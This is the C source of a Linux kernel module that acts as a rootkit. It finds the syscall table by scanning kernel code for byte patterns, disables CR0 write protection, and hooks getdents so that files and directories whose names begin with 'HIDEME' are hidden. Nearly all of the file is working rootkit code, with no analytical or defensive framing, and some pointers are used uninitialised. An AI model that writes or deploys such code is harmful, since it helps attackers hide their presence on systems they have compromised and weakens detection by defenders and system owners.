#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/slab.h>
#include <linux/unistd.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nathan Castets & Olivier Huge");

#define SEARCH_RANGE 512
#define PATTERN_LEN 7
#define MAGIC_PREFIX "HIDEME"
#define MAGIC_PREFIX_LEN 6

/* definition of file readdir.c */
struct linux_dirent {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	char d_name[1];
};

static void **sys_call_table;
static void **ia32_sys_call_table;

asmlinkage long (*real_getdents)(struct pt_regs *);

asmlinkage long fake_getdents(struct pt_regs *regs) 
{
	uint32_t i, j;
	long bytes_read;
	uint8_t *buffer;
	uint16_t d_reclen;
	uint16_t last_d_reclen;
	struct linux_dirent *dirent;
	struct linux_dirent *last_dirent;
	struct linux_dirent __user *dirent_user;
	
	bytes_read = (*real_getdents)(regs);
	dirent_user = (struct linux_dirent __user *)regs->si;
	buffer = kmalloc(bytes_read, GFP_KERNEL);
	if (!buffer) {
		printk(KERN_INFO "failed to kmalloc buffer");
		return bytes_read;
	}
	
	if(copy_from_user(buffer, (uint8_t *)dirent_user, bytes_read)) {
		printk(KERN_INFO "failed to copy_from_user dirent");
		kfree(buffer);
		return bytes_read;
	}
	
	i = 0;
	last_d_reclen = 0;
	dirent = (struct linux_dirent *)buffer;
	
	/* run through all the linux_dirent structures */
	while (i < bytes_read) {
		d_reclen = dirent->d_reclen;
		
		/* check matching with MAGIC_PREFIX */
		j = 0;
		while (j < MAGIC_PREFIX_LEN && dirent->d_name[j] != '\0' && 
		       dirent->d_name[j] == MAGIC_PREFIX[j])
			j++;
		
		/* hide directory entry */
		if (j == MAGIC_PREFIX_LEN)
			last_dirent->d_reclen += dirent->d_reclen;
		
		last_d_reclen = d_reclen;
		last_dirent = dirent;
		i += d_reclen;
		dirent = (struct linux_dirent *)(buffer + i);
	}
	
	if (copy_to_user(dirent_user, buffer, bytes_read))
		printk(KERN_INFO "failed to copy_to_user buffer");
	
	kfree(buffer);
	return bytes_read;
}

static void search_sys_call_table(void) 
{
	int i, j;
	uint32_t *do_syscall_64_offset;
	uint32_t *sys_call_table_offset;
	uint32_t *ia32_sys_call_table_offset;
	uint8_t *do_syscall_64;
	uint8_t *entry_SYSCALL_64 = (uint8_t *)native_read_msr(MSR_LSTAR);
	uint8_t pattern_0[] = {0x48, 0x89, 0xc7, 0x48, 0x89, 0xe6, 0xe8};
	uint8_t pattern_1[] = {0x48, 0x19, 0xc0, 0x48, 0x21, 0xc7, 0x48};
	uint8_t pattern_2[] = {0xd2, 0x21, 0xd0, 0x48, 0x89, 0xef, 0x48};
	
	/* look for pattern_0 in entry_SYSCALL_64 for call to do_syscall_64 */
	for (i = 0; i < SEARCH_RANGE; i++) {
		j = 0;
		while (j < PATTERN_LEN && 
		       entry_SYSCALL_64[i + j] == pattern_0[j])
			j++;
		
		if (j == PATTERN_LEN) {
			do_syscall_64_offset = 
				(uint32_t *)(entry_SYSCALL_64 + i + PATTERN_LEN);
			do_syscall_64 = 
				(uint8_t *)(entry_SYSCALL_64 
					    + i 
					    + PATTERN_LEN 
					    + sizeof(uint32_t) 
					    + *do_syscall_64_offset);
			break;
		} 
	}
	
	if (!do_syscall_64) {
		printk(KERN_INFO "failed to find do_syscall_64 address");
		return;
	}
	
	/* look for pattern_1 in do_syscall_64 for sys_call_table offset */
	for (i = 0; i < SEARCH_RANGE; i++) {
		j = 0;
		while (j < PATTERN_LEN && do_syscall_64[i + j] == pattern_1[j])
			j++;
		
		if (j == PATTERN_LEN) {
			sys_call_table_offset = 
				(uint32_t *)(do_syscall_64 + i + PATTERN_LEN + 3);
			sys_call_table = (void **)(*sys_call_table_offset);
			break;
		} 
	}
	
	if (!sys_call_table)
		printk(KERN_INFO "failed to find sys_call_table address");
	
	/* look for pattern_2 in do_syscall_32_irqs_on for ia32_sys_call_table offset */
	for ( ; i < SEARCH_RANGE; i++) {
		j = 0;
		while (j < PATTERN_LEN && do_syscall_64[i + j] == pattern_2[j])
			j++;
		
		if (j == PATTERN_LEN) {
			ia32_sys_call_table_offset = 
				(uint32_t *)(do_syscall_64 + i + PATTERN_LEN + 3);
			ia32_sys_call_table = 
				(void **)(*ia32_sys_call_table_offset);
		}
	}
	
	if (!ia32_sys_call_table)
		printk(KERN_INFO "failed to find ia32_sys_call_table address");
}

static void hook_syscall(void) 
{
	if (!sys_call_table) {
		printk(KERN_INFO "failed to hook syscall64");
		return;
	}
	
	write_cr0(read_cr0() & ~0x10000);
	real_getdents = sys_call_table[__NR_getdents];
	sys_call_table[__NR_getdents] = fake_getdents;
	write_cr0(read_cr0() | 0x10000);
}

static void unhook_syscall(void) 
{
	if (!sys_call_table) {
		printk(KERN_INFO "failed to unhook syscall64");
		return;
	}
	
	write_cr0(read_cr0() & ~0x10000);
	sys_call_table[__NR_getdents] = real_getdents;
	write_cr0(read_cr0() | 0x10000);
}

int init_module(void) 
{
	printk(KERN_INFO "prime module started");
	search_sys_call_table();
	hook_syscall();
	return 0;
}

void cleanup_module(void) 
{
	unhook_syscall();
	printk(KERN_INFO "prime module stopped");
}
